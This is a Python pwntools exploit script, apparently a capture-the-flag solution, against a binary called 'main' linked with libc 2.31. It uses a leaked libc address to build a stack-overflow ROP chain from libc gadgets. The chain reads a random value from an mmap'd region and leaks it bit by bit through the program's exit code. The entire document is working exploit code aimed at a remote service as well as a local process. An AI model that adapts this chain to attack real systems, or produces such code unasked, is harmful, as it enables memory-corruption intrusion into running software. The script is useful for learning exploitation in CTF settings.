#!/usr/bin/env python3
from pwn import *

e = ELF("main")
libc = ELF("./libc-2.31.so")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("addr", 1337)
	elif args.GDB:
		return gdb.debug(e.path, "b *(main+336)\nc")
	else:
		return process("./main")

if __name__ == '__main__':
	leak = int(input("open leak? "), 16)
	libc.address = leak - libc.sym['open']
	
	print(hex(libc.address))
	assert libc.address & 0xfff == 0
	
	# convenient
	la = libc.address
	mov_rax_rbx_pop = la + 0x000000000011cc4a
	add_rax_rcx = la + 0x00000000000abf48
	mov_rax_qword = la + 0x00000000001411fc # mov rax, qword ptr [rax] ; ret
	
	sub_rsp = la + 0x000000000011ef26
	push_rax_call = la + 0x0000000000024cc0
	mov_rsi_qwrd_rbx = la + 0x0000000000119fef
	push_add_dpop = la + 0x000000000013cc9c
	
	rop = ROP(libc)
	
	payload = b'a'*0x38
	
	# we are exploiting rbx's value here (this is why libc and ld is given)
	# rop.rcx.address is actually pop rcx ; pop rbx ; ret
	payload += p64(mov_rax_rbx_pop)+p64(0)+p64(rop.rcx.address)+p64(e.sym['randAddr']-e.sym['__libc_csu_init'])+p64(0)+p64(add_rax_rcx)+p64(mov_rax_qword)
	
	# now rax is mmap'd region
	
	mov_cl_byteptr = la + 0x0000000000184e44 # mov cl, byte ptr [rsi + rdx - 1] ; sub eax, ecx ; ret
	mov_rax_rsi_pop = la + 0x0000000000134871 # mov rax, rsi ; pop rbx ; ret
	add_rax_rcx = la + 0x00000000000abf48
	cmp_byteptr_cl = la + 0x0000000000128322
	jg_ret = la + 0x000000000010c74b # jg 0x10c7c5 ; ret
	
	exit_gadget = la + 0x000000000011f133 # mov rdi, rax ; mov eax, 0x3c ; syscall
	shr_rax = la + 0x00000000000cf73a # shr rax, 2 ; ret
	
	CHAR_IDX = int(input("char idx: "))
	
	payload += p64(mov_rax_qword) + (4 * CHAR_IDX) * p64(shr_rax) + p64(exit_gadget)
	
	print(payload.hex())
	assert len(payload) < 1024
